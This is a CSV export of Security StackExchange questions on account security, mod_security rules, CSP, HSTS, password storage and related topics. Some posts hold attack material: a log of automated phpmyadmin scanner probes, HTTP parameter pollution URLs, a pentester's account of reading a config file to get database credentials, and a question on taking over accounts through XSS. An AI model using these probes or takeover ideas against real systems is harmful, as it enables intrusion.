<p>The associated phone number and recovery email can be changed, in fact I expect the attacker to change them immediately so there is no real value in them. Is there a way how to link my gmail account to my real life identity; a paid service maybe?</p>
","2337","","98538","","2016-12-04 23:26:09","2020-12-07 11:43:34","Gmail account hack prevention and recovery","<attack-prevention><incident-response><gmail><account-security>","5","0","","","","CC BY-SA 3.0"
"210615","1","","","2019-05-22 16:14:17","","2","123","<p>I run a website with a resource &amp; time consuming URL, say ~20 seconds per request. In the last few days this URL is being targeted by some kind of DoS attack, and I'm trying to use mod_security so none can abuse this URL. It makes no sense a real (ie human) user hits this URL more than once every 5 seconds, so I ended up with this:</p>

<pre><code>&lt;LocationMatch ""/mySlowUrl/""&gt;
        SecRuleEngine on
        SecAction phase:2,id:10001,initcol:IP=%{REMOTE_ADDR},pass,nolog
        SecRule IP:soslow ""@eq 1"" phase:2,id:10002,deny,status:503,nolog,setenv:SOSLOW
        SecAction phase:2,id:10003,setvar:IP.soslow=1,expirevar:IP.soslow=5,pass,nolog
        Header always set Retry-After ""5"" env=SOSLOW
&lt;/LocationMatch&gt;
</code></pre>

<p>It ""works"", but as long as persistent storage is only saved at the end of request processing, IP:soslow is only set after the whole 20 seconds first request, so the attacker still has 20 seconds to overload the server.</p>

<p>Is there any way to flush persistent variables so they are written as soon as rule is processed (in phase 2)? Any other idea to stop this attacks?</p>
","208594","","","","","2022-10-03 22:30:31","mod_security flush persistence","<mod-security>","0","0","","","","CC BY-SA 4.0"
"210656","1","210658","","2019-05-23 11:34:28","","62","8580","<p>I have recently logged into a website. When I clicked on the ""Update Profile"" page, you are displayed with a list of text boxes for all the user fields, e.g. name, email, phone number etc.</p>

<p>There is also a box for password and confirm password (for if you wish to update these values), however, when you go into this page, those boxes are already populated, which made me think, why are they putting placeholders in?</p>

<p>When going into inspect element, they actually have the values of your password, transformed into upper case like this:</p>

<pre><code>&lt;input type=""password"" name=""txtPassword2"" size=""45"" value=""MYPASSAPPEARSHERE""&gt;
</code></pre>

<p><strong>I have also recently noticed that the case of your password or username is irrelevant when logging in - e.g. I can put it in all caps, all lower, or a mixture of both and it will still accept the password.</strong></p>

<p>Is this a security hole and does this indicate they are storing passwords as plain text?</p>

<p>This is not a duplicate of (<a href=""https://security.stackexchange.com/questions/7118/what-to-do-about-websites-that-store-plain-text-passwords"">What to do about websites that store plain text passwords</a>) as I’m asking here for clarification of whether this <strong>indicates</strong> the site is storing plaintext passwords, rather than what to do about it. </p>

<hr>

<p><strong>Response from the company:</strong> After pushing hard, the company confessed that they are in fact, storing passwords in plain text. </p>
","208677","","208677","","2019-05-25 07:28:58","2019-05-26 16:30:35","Website returning plaintext password","<passwords><web-application><account-security>","3","10","","2019-05-29 09:33:15","","CC BY-SA 4.0"
"210744","1","","","2019-05-24 16:30:54","","0","1304","<p>I found that the security header for protection against mitm attacks in <em>first connection</em> is to implement HSTS <code>preload</code> directive and add the list of google: <a href=""https://hstspreload.org/"" rel=""nofollow noreferrer"">https://hstspreload.org/</a></p>
<p>However the requisites to do that is to include all subdomains of the domain given. This makes a problem to websites that are really big, they just want to preload the domain and not the subdomains...</p>
<p>1)is there any way to make this work?
2) does the preload of the domain preloads subdomains too? i may be getting all wrong</p>
<hr />
<p><em>personal example/experience:</em></p>
<p>i was doing pentesting against a website example.com and it was preloaded and added to the hstspreload list, however i found that vulnerable.example.com subdomain didn't have HSTS header and it wasn't preloaded, so of course it was vulnerable to mitm attacks, but how? it had the domain preloaded, and to add it there you need to add subdomains too... so was this an exeption or what happened here?</p>
","206540","","-1","","2020-06-16 09:49:05","2019-05-24 18:40:21","HSTS preload and requisites on domain - subdomains must be added too?","<man-in-the-middle><hsts><content-security-policy>","1","0","","","","CC BY-SA 4.0"
"142658","1","","","2016-11-15 13:01:56","","2","2178","<p>recently I've identified that some hack attempt was performed at one of my servers.</p>

<p>I have dumped nginx logs to github, please take a look and try to identify which tool was used to perform this attack.</p>

<p>Excerpt from log:</p>

<pre><code>195.154.41.132 - ktuser [04/Nov/2016:12:59:18 -0400] ""POST /apply.cgi HTTP/1.1"" 404 459 ""-"" ""-""
195.154.41.132 - ktuser [04/Nov/2016:12:59:18 -0400] ""GET /cgi_bin/user_network_connection.asp HTTP/1.1"" 404 459 ""-"" ""-"" 
162.243.79.108 - - [01/Nov/2016:16:39:57 -0400] ""HEAD http://8.8.8.8:80/phpmyadmin4/ HTTP/1.1"" 404 0 ""-"" ""Mozilla/5.0 Jorgee""
162.243.79.108 - - [01/Nov/2016:16:39:57 -0400] ""HEAD http://8.8.8.8:80/2phpmyadmin/ HTTP/1.1"" 404 0 ""-"" ""Mozilla/5.0 Jorgee""
162.243.79.108 - - [01/Nov/2016:16:39:57 -0400] ""HEAD http://8.8.8.8:80/phpmy/ HTTP/1.1"" 404 0 ""-"" ""Mozilla/5.0 Jorgee""
162.243.79.108 - - [01/Nov/2016:16:39:57 -0400] ""HEAD http://8.8.8.8:80/phppma/ HTTP/1.1"" 404 0 ""-"" ""Mozilla/5.0 Jorgee""
162.243.79.108 - - [01/Nov/2016:16:39:57 -0400] ""HEAD http://8.8.8.8:80/myadmin/ HTTP/1.1"" 404 0 ""-"" ""Mozilla/5.0 Jorgee""
162.243.79.108 - - [01/Nov/2016:16:39:57 -0400] ""HEAD http://8.8.8.8:80/shopdb/ HTTP/1.1"" 404 0 ""-"" ""Mozilla/5.0 Jorgee""
</code></pre>

<p>Full log can be seen here:
<a href=""https://gist.github.com/acosonic/772971fee7b4b20c5ba3da7657a42430"" rel=""nofollow noreferrer"">https://gist.github.com/acosonic/772971fee7b4b20c5ba3da7657a42430</a></p>

<p>Also, please advice if there is some behavioural tool that would learn and identify that above is a threat, and ban such IP's.</p>
","130538","","130538","","2016-11-15 13:56:41","2021-02-05 12:43:38","Anyone can identify tool used to perform this attack?","<firewalls><intrusion><nginx><mod-security><log-analysis>","1","7","","","","CC BY-SA 3.0"
"142728","1","","","2016-11-16 00:18:05","","2","71","<p>What is the extent to which data is separated between user accounts on Android? For example, can I have a different facebook account/any other social media account on each and trust these won't be linked in any way? </p>
","130605","","","","","2016-11-16 00:18:05","Extent of data seperation within multiple user accounts in Android","<account-security>","0","1","","","","CC BY-SA 3.0"
"210816","1","","","2019-05-26 18:12:44","","-1","135","<p>For the past few months, I've been unable to continue a particular course on  udemy.  I can access all other video courses accept that particular course and their support has answered ""We recently upgraded our content delivery network and now use cookies to authenticate each video playback session for enhanced security.  Please go to 'cookies' in your browser settings and allow the property udemycdn-a.com."" </p>

<p>I'm already authenticated when I log in and I can view all other courses, so I don't know why just this one particular course requires this change but not any of the others (even newer ones).  Does this sound strange to anyone else?  Why would this particular course require ""enhanced security"" when udemy is hosting it? It just sounds shady to me. Thanks.</p>
","191190","","","","","2019-05-26 19:35:05","CDN change for ""enhanced security""? (now uses cookies)","<authentication><web-browser><cookies><account-security>","2","2","","","","CC BY-SA 4.0"
"73838","1","","","2014-11-28 01:43:36","","1","208","<p>Is there any tool or method to  separate normal traffic and malicious traffic from pcap? For example : if malicious traffic detected with snort i need to store those packets .only if malicious traffic .  Thanks for respond.</p>
","30276","","30276","","2014-11-28 04:52:58","2014-11-28 04:52:58","Separate normal traffic","<forensics><snort><security-theater>","2","7","","2014-11-28 17:38:07","","CC BY-SA 3.0"
"142999","1","","","2016-11-18 22:59:43","","1","698","<p>We are moving to Amazon our on-premise infrastructure and I'm trying to follow this document to increase our security of the ec2 instances :
<a href=""https://benchmarks.cisecurity.org/tools2/linux/CIS_Amazon_Linux_Benchmark_v2.0.0.pdf"" rel=""nofollow noreferrer"">CISecurity Benchmark for Amazon Linux</a></p>

<p>In the document, it's asked to create 6 differents partitions for:
- /tmp
- /var
- /var/tmp
- /var/log
- /var/log/audit
- /home</p>

<p>I mean, the creation of those separate partitions does increase really the security ?
Because cost-wise for me it looks like increasing significantly the cost of each instances by adding 6 different EBS volumes for those partitions...</p>

<p>Thanks for your knowledge sharing.</p>
","130907","","","","","2017-09-08 03:29:41","CISecurity AMI EC2 Amazon","<audit><content-security-policy><amazon>","2","0","0","","","CC BY-SA 3.0"
"4802","1","","","2011-06-25 23:16:58","","3","3533","<p>I'm trying to get my users lat. and lng. from their address using Google's geocoding API but when mod:security is enabled, it prevents it and the script times out. How can I add an exception by IP or domain for this or just remove whatever configuration that makes mod_security do this?<br>
I am using the <a href=""https://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project"" rel=""nofollow"">OWASP ModSecurity Core Rule Set Project</a></p>

<p>UPDATE:</p>

<pre><code>[Sun Jun 26 13:13:14 2011] [error] [client 174.252.196.188]
 ModSecurity: Unable to retrieve collection (name ""ip"", key ""174.252.196.188_fc2ccdca4bf1fc8585b77c1444811dedd59da612"").
 Use SecDataDir to define data directory first. [hostname mydomain.com""] [uri ""/admin/geocoding.php""]
 [unique_id ""EIpfP38AAAEAAA2eAT0AAAAK""]
</code></pre>

<p>I have added this line:</p>

<pre><code>SecDataDir /var/log/apache/modsec_SecDataDir
</code></pre>

<p>Now, I don't get anything in the error log, but still the same behaviour!</p>
","2287","","78998","","2015-12-14 16:35:39","2015-12-14 16:35:39","Mod_security for Apache2 blocks cURL!","<apache><owasp><waf><mod-security><curl>","1","2","","","","CC BY-SA 3.0"
"211162","1","211209","","2019-06-01 16:39:25","","0","135","<p>I have a very common use case where an admin is creating an account of the user and then I need to send the login id generated by my system to the user. And the user will need to set a password on the first login.</p>

<p>So my question here is should I send the user id on email and if yes, then what are the security risks that must need to be incorporated?</p>
","209355","","","","","2019-06-02 23:35:16","Should I send login id on email?","<authentication><email><account-security>","1","3","","","","CC BY-SA 4.0"
"143098","1","","","2016-11-20 08:34:35","","3","137","<p>I use a commercial web host, when I log in via regular FTP this is how the directories looks like:</p>

<p><a href=""https://i.stack.imgur.com/5rVEE.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/5rVEE.png"" alt=""dir structure""></a>  </p>

<p>It seems strange that I can access system files, I thought I would be limited to access files below my user folder or web root folder (which is within ""customers""). Does my webhost have a security issue or is it normal?</p>
","131027","","98538","","2017-03-02 10:14:00","2017-03-02 10:14:00","Should my webhost show the root filesystem over FTP?","<account-security><ftp><web-hosting>","3","1","","","","CC BY-SA 3.0"
"143235","1","","","2016-11-21 21:37:16","","1","934","<p>I am building an app that will be storing sensitive info (SSN's, DOB's, Financial Information, Credit Cards, etc.</p>

<p>Is there a standard that will cover all these items and what is the best approach to storing? Should blobs be used?</p>
","131182","","485","","2016-12-22 14:33:42","2016-12-22 14:33:42","What is the best Practice / Industry Standard for storing documents with social security numbers, date of birth, financial records, etc?","<content-security-policy><standards><sensitive-data-exposure>","1","5","","2016-12-25 23:31:58","","CC BY-SA 3.0"
"143288","1","","","2016-11-22 15:11:11","","20","4188","<p>I noticed that some folders in the PATH environment variable (e.g. <strong>C:\Python</strong>) give write privileges to anyone on the machine, including users without Admin rights. I understand that people can probably modify the Python executables and things in that folder. However, how dangerous is it if I don't use Python? Also, since most programs on Windows are called either through GUI or with absolute paths, could this issue still affect other more sensitive folders in PATH such as <strong>System32</strong>?</p>
","131262","","37636","","2016-11-22 21:28:59","2016-11-23 14:07:20","Some folders in the PATH variable are writable by anyone. Dangerous or not?","<account-security><environment-variables><windows-7>","3","3","","","","CC BY-SA 3.0"
"143370","1","","","2016-11-23 10:26:00","","2","513","<p>Is there any particular reason (security) for us to implement Soft Delete Mechanism on Deleting User ID or Hard Delete.</p>

<p>I am trying to make my user id better for my web application</p>

<p>thank you. </p>
","131344","","","","","2016-11-24 01:08:24","User ID Soft Delete or Hard Delete?","<deletion><account-security>","1","2","","","","CC BY-SA 3.0"
"74676","1","74686","","2014-12-10 04:12:14","","0","695","<p>I wanted to create a winform application that have a centralized security database. This application is portable, can be save to any PC and simply run the .exe to use, hence there will be many copies of this software. However, it will require a User login, this login account credentials will refer to centralized security database(centralized DB is for security purpose only). If the PC does not have a Internet connection, the software will not be able to identify the credentials. Hence, i came up with an ideal is to put a time stamp, if the last connection to centralized is DB is &lt; 24h, local credential(DB copy from centralized DB) login is granted. But the problem i face now is, the time stamp and 24H limit will have to refer to current system time in the PC(which can be change easily to bypass the time stamp). what is the solution? Any other method that can control the User while the application goes offline? </p>
","62228","","","","","2014-12-10 10:34:14","WinForm Application Security","<authentication><security-seal>","2","1","","","","CC BY-SA 3.0"
"143728","1","143785","","2016-11-27 23:21:46","","2","133","<p>I want to create a system for sensitive information that is only accessible if you have a specific tablet and a specific USB thumb drive. I want to setup such a system for my daughter when she is a certain age, the system will contain certain information I want to pass on.</p>

<p>Is that possible in some way? I have no idea where to start on such a thing.</p>
","131758","","112042","","2016-11-27 23:36:51","2016-11-29 08:44:38","Digital time capsule system","<multi-factor><account-security>","1","5","","","","CC BY-SA 3.0"
"211735","1","211736","","2019-06-12 09:22:11","","7","7876","<p>script-src-attr and script-src-elem directives are new additions in CSP3.
I am not able to understand how are they different from the script-src directive.</p>

<p><a href=""https://w3c.github.io/webappsec-csp/#directive-script-src-elem"" rel=""noreferrer"">https://w3c.github.io/webappsec-csp/#directive-script-src-elem</a></p>

<p>This documents the new addition but I am not able to clearly differentiate between the usage, maybe due to hard language.</p>
","210023","","","","","2020-03-08 12:02:35","CSP: What is script-src-attr and script-src-elem?","<xss><javascript><content-security-policy><header>","1","0","","","","CC BY-SA 4.0"
"211844","1","","","2019-06-14 09:35:55","","0","942","<p>I was just wondering if someone having total control over his/her network, is running my mobile app. Also wireshark is capturing all requests made using the network. My app is calling API endpoint like <a href=""http://bob.com/alice/param1/param2"" rel=""nofollow noreferrer"">http://bob.com/alice/param1/param2</a> and also passing the HTTP parameters.  </p>

<p>Is wireshark capable to capture the network requests like this and is the url visible?  </p>

<p>Also is it possible for someone to track the HTTP parameters I am passing it?</p>

<p>Is it plaintext if I am not using HTTPS? What if it's just a HTTP call? </p>

<p>If not using wireshark, is there any other way to capture network calls made by the app (android / iOS / PhoneGap / Ionic)? </p>
","172812","","195961","","2019-06-14 11:35:25","2019-06-14 12:17:02","Can wireshark capture the exact payload and end point of API used by my Mobile APP?","<mobile><account-security><api><network-scanners><wireshark>","2","0","","","","CC BY-SA 4.0"
"143850","1","","","2016-11-29 07:56:49","","1","208","<p>One of the customers does not have FQDN, only virtual ip, and two servers.
Primary and Secondary. Do we need to generate and install two seperate TLS certificate for both the servers. Or can we assign a FQDN and use one single wildcard certificate in redundancy setup ?</p>
","131899","","","","","2016-11-29 12:25:23","TLS certificate in redundancy setup","<tls><certificates><openssl><certificate-authority><content-security-policy>","1","0","","","","CC BY-SA 3.0"
"75848","1","75852","","2014-12-12 17:33:49","","0","166","<p>I was doing an pen test in a website and the programmer did a big mistake and I was able to read any file. So I read the <code>web.config</code> and see the password for database was in <code>ConnectionStrings_Prod.config</code>.</p>

<p>Before report and just for curiosity, I tried to connect to database. This is MS SQL Server 2014. Because my lack of knowledge, I wasn't able to connect using common program. </p>

<p>So, this was my mistake only? Or this is a second line of defense, because only computer inside the server can connect to the database? (I am outside, in my company) </p>

<p>This is the entire file.</p>

<pre><code>&lt;connectionStrings&gt;
  &lt;remove name=""LocalSqlServer"" /&gt;
  &lt;add name=""LocalSqlServer"" connectionString=""Data Source=10.#.#.#\MSSQLSRV2014,24##;Initial Catalog=****;uid=*****;pwd=****;pooling=true; Min Pool size=50;; Max Pool Size=1000000;Connect Timeout=200;Packet Size=32767;trusted_connection=false;""
    providerName=""System.Data.SqlClient"" /&gt;
  &lt;add name=""**.Properties.Settings.*****ConnectionString""
    connectionString=""Data Source=10.#.#.#\MSSQLSRV2014,24##;Initial Catalog=*****;uid=******;pwd=******;pooling=true; Min Pool size=50; Max Pool Size=1000000;Connect Timeout=200;Packet Size=32767;trusted_connection=false;""
    providerName=""System.Data.SqlClient"" /&gt;
&lt;/connectionStrings&gt;
</code></pre>

<p><strong>What is the impact of this security fault?</strong></p>
","8745","","8745","","2015-01-20 03:07:00","2015-01-20 03:07:00","What is the severity if someone read the ConnectionStrings_Prod.config?","<passwords><databases><data-leakage><security-theater>","2","0","","","","CC BY-SA 3.0"
"143964","1","144186","","2016-11-30 09:13:10","","10","4925","<p>Both options seem to control who can embed the content in an <code>&lt;iframe&gt;</code> tag, just like <code>X-Frame-Options</code> does. Chrome and Safari are deprecating this header (partially, <code>allow-from</code> for instance), so it's a matter of time that it will no longer used by Firefox and Edge as well, so only Content-Security-Policy will be available.</p>

<p>I've been doing some tests, and the same result (block / allow specific domain) is achieved by using either of those options, so, what's really the difference between them? </p>

<p>Expecting some usage examples where one is useful and the other it's not.</p>
","","user15194","","","","2019-09-30 21:03:04","What's the difference between frame-ancestors and child-src?","<content-security-policy><mixed-content>","1","2","","","","CC BY-SA 3.0"
"211917","1","","","2019-06-16 06:33:42","","3","210","<p>My iCloud account has been hacked.</p>

<p>I access links sent by hackers that compromise my iCloud account. The hackers don't have physically access to my phone, the compromised links are sent by them through a picture via whatsapp, notification on pinterest or SMS including a link to a promotion.</p>

<p>Once I click on the respective compromised link, any application that I download from the App store is duplicated on another Android device, hence each time I am logging on Yahoo Mail, LinkedIN etc apps, I see that in the same time another Android device is connecting as well to my accounts- this device is named ""iPhone"", but it has Android logo. Then, I create a brand new iCloud account and this duplication doesn't take place anymore, until I click again on another compromised link.</p>

<p>How can I solve this security problem? I have to add that the compromised links are sent in different forms, as mentioned above, hence I stopped to use my social apps.</p>

<p><a href=""https://i.stack.imgur.com/evyVf.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/evyVf.jpg"" alt=""enter image description here""></a></p>
","209926","","209926","","2019-06-16 11:42:38","2019-06-16 11:42:38","Hacked iCloud account: how can I protect my iPhone security?","<account-security><iphone><smartphone>","0","0","0","","","CC BY-SA 4.0"
"144136","1","177411","","2016-12-02 02:07:27","","3","705","<p>I was implementing a CSP policy and set up the reporting endpoint as another domain, a completely separate origin. Everything seemed to work fine, but talking to a few friends they seemed surprised that it worked as they thought that CSP reports could only go to the same domain or a subdomain. I looked around online and read through the <a href=""https://www.w3.org/TR/CSP/#security-violation-reports"" rel=""nofollow noreferrer"">spec</a> but didn't find anything that substantiated their theory that it used to be that way.</p>

<p>I'm cautious going forward because I'd rather set up a reporting endpoint that I could get consistently rather than one that might fail on older browsers. Is there any truth to their suspicions that cross-origin reporting used to not be supported?</p>

<p>Thanks in advance :)</p>
","67657","","67657","","2016-12-31 22:36:08","2019-06-07 06:24:32","CSP reporting to another origin","<content-security-policy>","3","0","","","","CC BY-SA 3.0"
"144210","1","","","2016-12-02 22:30:58","","1","47","<p>I don't know if my question belongs here, but I had a very strange experience with my computer today. I normally put my laptop to sleep when I don't use it, but, today, when I opened it, a booting configuration option for Phoenix Technologies for a Toshiba computer appeared on my screen. My laptop brand is not even Toshiba, so I was puzzled. There seemed to be no way to escape this process, so I pressed the on/off button to restart. Then, my laptop functioned normally. Is this something to be concerned about? What could have been the problem? </p>
","132314","","","","","2016-12-02 22:30:58","Strange Configuration Process","<account-security>","0","0","","2016-12-03 07:21:11","","CC BY-SA 3.0"
"144212","1","","","2016-12-02 23:22:28","","15","4311","<p>Is anyone here able to clarify how caching affects adding a <code>nonce=value</code> to all inline javascript?</p>

<p>If the nonce must be unique and unpredictable, then one would need to disable all server-side (i.e. Varnish, Cloudfront, etc) caching on the pages that use <code>&lt;script nonce=""XXXXX""&gt;</code>. Correct?</p>

<p>See <i>example 4</i> <a href=""http://www.cspplayground.com/csp_overview"" rel=""noreferrer"">here</a> for details.</p>
","130015","","98538","","2016-12-02 23:31:45","2023-09-20 05:57:16","HTTP Content-Security-Policy Nonce and Caching","<http><javascript><content-security-policy><caching>","5","0","","","","CC BY-SA 3.0"
"212175","1","212180","","2019-06-20 15:07:57","","2","408","<p>I am currently using 9 digit numbers to authenticate writers on two apps. In the first app, this unlocks editing tools for use in making content rich dhtml documents which are stored on the local machine by default. With the second app, it opens up create/edit/delete functionality for content items (meant for low security, non-personal content) stored in a DB. But in this app all changes are versioned, so in the case of a malicious user it is just a question or reverting to the previous good version.</p>

<p>To summarize, I'm using weak credentials for access to limited functionality to two apps meant to be used with fairly open &amp; shared information. And my credential system could always be hardened sometime down the road as the app requirements warrant. </p>

<p>So my question is for those with deep knowledge and experience in computer security: Is this a mistake? What is there to look out for that I'm probably not aware of? Am I going to regret not using stronger credentials later on?</p>
","210578","","","","","2019-06-20 20:57:24","Is using weak login credentials always bad?","<passwords><password-policy><account-security>","3","1","","","","CC BY-SA 4.0"
"212203","1","212204","","2019-06-21 04:27:09","","2","656","<p>I know browsers use cookies so that, for example, if I log into Facebook on a public computer and forget to log out, the next person who opens up a new browser can go into my account.</p>

<p>Does this work the same way for shared VPNs, especially on sites that are not http<strong>s</strong>? Can someone on the same VPN network tap your traffic and cookies, gaining access to your private accounts?</p>
","210603","","","","","2019-06-21 08:45:01","When using a shared / public VPN, can others on the same IP address log into your accounts?","<privacy><vpn><cookies><account-security>","1","0","","","","CC BY-SA 4.0"
"212254","1","","","2019-06-22 00:27:49","","1","180","<p>I lost a cd key for a very old game and need to replace it with a new one. I can't find anymore physical copies to buy, but I found cd keys for them are offered on sites like Ebay which could replace my own. I would buy and they would email me the cd key via ebay or paypal or a personal email.</p>

<p>My concern is the sketchiness of this practice and distancing myself from the unlikely but possible blow-back. To narrow the discussion let's assume the buyer may have a hidden agenda, but that they are still providing the real code. I would also request the ethics of the situation not be discussed as these are covered in many similar discussion already.</p>

<ol>
<li><p>How can I attain this keycode as anonymously as possible? Having my name and banking associated with the transaction is potentially unfavorable.</p></li>
<li><p>How can I attain this keycode without fear that my credit card information might be recharged or used in some sketchy business?</p></li>
<li><p>if the keycode is being emailed to me what do I need to do to safely view the code? I mean there's the obvious of not clicking third party links but I hear sometimes simply opening an email, even without loading images, is enough to hurt you?</p></li>
</ol>

<p>What would be best practice to addressing these 3 concerns? I was thinking of maybe making a paypal account then paying with that then closing the paypal account afterwards so it couldn't be charged by a seller ever again. Would my bank and credit card only know that paypal was charging them for an obscure reason? Thus keeping the full details separate? Or is it different if I transfer the exact amount to paypal as a simple deposit, then do the transaction with just the deposited amount so its just paypal who knows. Or is it irrelevant to do any of this and I might as well just use my actual credit card directly via ebay? And in terms of opening and viewing that code safely how would I do it...and which email is best to use.</p>

<p>And since the seller is for sure going to give the code when paid, can I pay them in a more discreet way by refusing certain buyer protections? FOr example giving a clerk 5$ to come to your house and deliver milk tomorrow, versus signing a full contract with him to come to your house and deliver milk tomorrow for 5$...a contract in that case is less anonymous.</p>
","210673","","210673","","2019-06-22 00:46:32","2019-06-22 09:04:50","Buying keycodes online safely/anonymously","<account-security><credit-card><paypal>","2","0","","","","CC BY-SA 4.0"
"212348","1","212354","","2019-06-24 10:32:21","","41","5767","<p>I'm reading about HTTP parameter pollution and I'm confused about one thing. If there is an endpoint like this,</p>

<pre><code>https://security.stackexchange.com/editpost/?postuid=19348
</code></pre>

<p>and you tried a HPP attack, that looked like</p>

<pre><code>https://security.stackexchange.com/editpost/?postuid=19348&amp;postuid=1
</code></pre>

<p>Wouldn't the backend still try to verfiy that it's your user's post you're trying to edit? through the cookies you send along with the request</p>

<p>Why could this work,</p>

<pre><code>https://security.stackexchange.com/editpost/?postuid=19348&amp;postuid=1
</code></pre>

<p>and why can't you just edit the URL like this?</p>

<pre><code>https://security.stackexchange.com/editpost/?postuid=1
</code></pre>
","210795","","98538","","2019-06-24 13:23:00","2019-06-24 22:41:54","Why do I need two parameters in an HTTP parameter pollution attack?","<xss><account-security>","1","1","","","","CC BY-SA 4.0"
"144389","1","","","2016-12-05 12:39:23","","0","811","<p>Why exactly is important? Are there any significant reasons that information/cyber security should be taken seriously, for an average internet user? I've heard of broad explanations (like others could access your personal info), but never exactly how serious and scary it is. Why do we need to care about it?</p>
","132489","","132489","","2016-12-05 13:22:06","2016-12-05 13:40:07","Why is information/cyber security important to the average internet user?","<account-security>","2","6","","2016-12-05 14:03:57","","CC BY-SA 3.0"
"212400","1","212401","","2019-06-25 09:33:35","","0","276","<p>If I have discovered an XSS vulnerability, is there another way of gaining access to an account without session hijacking? Mainly because on most of the sites I test, the HttpOnly and Secure flags are set on the session ID, so I can't access it through javascript (<code>document.cookie</code>). I know I could do some fake form asking for the username and password, but is there another way?</p>
","210795","","98538","","2019-06-25 10:19:02","2019-06-25 10:19:02","Is there another way than session hijacking to access user account through XSS?","<xss><session-management><account-security>","2","1","","","","CC BY-SA 4.0"
"212425","1","212462","","2019-06-25 15:31:46","","0","315","<p>I am able to do the following and connect successfully without any type of credentials:</p>

<pre><code>telnet &lt;IP Address&gt; 25
</code></pre>

<p>When I am in I can verfiy emails, send emails, etc. I feel like this is a security risk. Is there a way of putting some type of protection in place to block direct access from happening like that? This has been tested externally and internally, both yield same results.</p>
","193366","","53333","","2019-06-25 23:30:22","2019-06-25 23:33:35","Block SMTP Connection That Doesn't Have Credentials","<email><access-control><account-security><smtp>","1","5","","","","CC BY-SA 4.0"
"144711","1","","","2016-12-07 23:18:20","","3","13050","<p>I have been exploring data security lately and came across HDD data recovery. I now know that a format simply deletes the ""pointers"" to files and directories and that data is still there. The only way to completely wipe the drive is to either physically destroy it or overwrite the complete drive with random sequences of 0s and 1s.</p>

<p>But how secure is it really? </p>

<p>I have found a Secure Erase option on my HP laptop's BIOS. I have read multiple articles online and most people recommend DBAN and similar software. </p>

<p>From what I can understand, Secure Erase only differs from other software in the way it overwrites things, meaning, that the overwriting process takes place in the hardware itself (built-in HDD commands or something like this, I'm no expert, correct me please).</p>

<p>So... Let's suppose that you need your data to be destroyed completely so that it's irrecoverable... How secure is Secure Erase really? What if you run it multiple times in a row, let's say 3 - 7. How secure is it if we compare it to other secure erasing tools such as DBAN and so on? </p>

<p>Let's not forget that before you perform the Secure Erase operation, DriveLock asks you for a recovery password just in case your system shuts down during the process... What happens with that DriveLock and password, do they get overwritten too at the end?</p>
","132774","","66423","","2023-08-24 13:22:16","2023-08-24 13:22:16","How secure is Secure Erase option in BIOS?","<deletion><bios><ata-security>","3","1","","","","CC BY-SA 3.0"
"212840","1","","","2019-07-03 11:12:20","","1","366","<p>Yesterday I logged on to my banking app via my iPhone. The normal procedure was to enter information that consisted of:</p>

<ol>
<li>The answer to a security question. This had to be entered in full and was the same during each login.</li>
<li>Three characters from an additional string. The specific characters asked for were different for each login.</li>
</ol>

<p>A message appeared which said that they were ""upgrading"" this to be more secure. It involved setting up a security answer (a string which was different to [1]). However, after using this it simply said that touch (fingerprint) ID could be used instead of using any of this information.</p>

<p>In theory this sounded ok, but it then said that it would work for anyone who had a fingerprint access for the device. The device in question is an iPhone SE. Given it's possible for multiple fingerprints to work on an iPhone I was wondering how secure this actually is?</p>

<p>I have a couple of thoughts on this:</p>

<ol>
<li>If I have to enter the details as in [1] and [2] then only I know them (unless they are leaked). So in theory only one person knows these details (me).</li>
</ol>

<p>versus:</p>

<ol start=""2"">
<li>If someone else has fingerprint access on the device I use they can enter the app without any additional details.</li>
</ol>

<p>My thoughts were what if this was a shared device (e.g. family iPad/phone)? This is possible - and quite often the case - for example:</p>

<blockquote>
  <p>Or, maybe you share an iPad with your significant other, and they want to use Touch ID too. There’s any number of valid scenarios where you’d want to use a different finger with your Touch ID sensor. Luckily, Apple anticipated this because iOS allows you to add as many fingerprints to your device as you want</p>
</blockquote>

<p>(Source: <a href=""https://www.howtogeek.com/205525/how-to-add-touch-id-fingerprints-to-iphone-or-ipad/"" rel=""nofollow noreferrer"">https://www.howtogeek.com/205525/how-to-add-touch-id-fingerprints-to-iphone-or-ipad/</a>) </p>

<p>In the previous method it relied on someone entering details only they knew, versus a method multiple people may be able to perform.</p>

<p>I won't name the bank in case this is some serious issue.</p>

<p>Please can someone provide details about whether this is genuinely a step in the right direction in terms of security and whether there are advantages/disadvantages over the previous method? </p>
","211503","","211503","","2019-07-03 11:24:01","2019-07-03 12:22:37","Banking app logon - multiple fingerprints on a device vs 2 passwords known by 1 person","<passwords><password-management><account-security><banks><fingerprint>","1","1","","","","CC BY-SA 4.0"
"213018","1","213022","","2019-07-05 16:48:16","","1","232","<p>I have always used long passphrases for my own Windows user accounts. But I know some people who use moderately common passwords (we'll say they're in the <a href=""https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkweb2017-top1000.txt"" rel=""nofollow noreferrer"">top 1,000 most used passwords</a>, but not in the <a href=""https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkweb2017-top100.txt"" rel=""nofollow noreferrer"">top 100</a>).</p>

<p>From <a href=""/q/22941/129883"">Why do we lock our computers?</a>, I see that locking protects you from attackers who are unskilled or not prepared, and can even slow down prepared attackers for a few minutes. But if a capable attacker is alone with your computer for any extended period of time, they can get in if you don't have full-disk encryption.</p>

<p>Does it make sense to use a strong account password (that is, something not in any password list)? Nobody is going to try the top 1,000 passwords if they're alone with your computer for a few minutes, and if they're with your computer for longer than that they can use other means.</p>

<p>Suppose RDP is disabled on the computer and the <a href=""/q/149833/129883"">administrator account has a lengthy, unique passphrase</a>. We'll also suppose that the user's password is not one they use elsewhere. Is there any attack that becomes easier if a non-administrator user password is in a list of common passwords?</p>
","129883","","","","","2019-07-06 02:40:44","Do non-administrator Windows accounts need strong passwords?","<passwords><windows><password-policy><account-security><risk-analysis>","1","4","","","","CC BY-SA 4.0"
"213029","1","","","2019-07-06 02:23:54","","0","118","<p>If I'm creating an authorization service for my application, why can't I just hash the password and save the the username and hashed password in my User table? Why should I use a token authentication service like JWT? I don't think I'm right but I feel like I'm missing something here.</p>
","211720","","","","","2019-07-06 02:43:49","Why do we need token authentication?","<web-application><privacy><oauth><account-security><jwt>","1","0","","","","CC BY-SA 4.0"
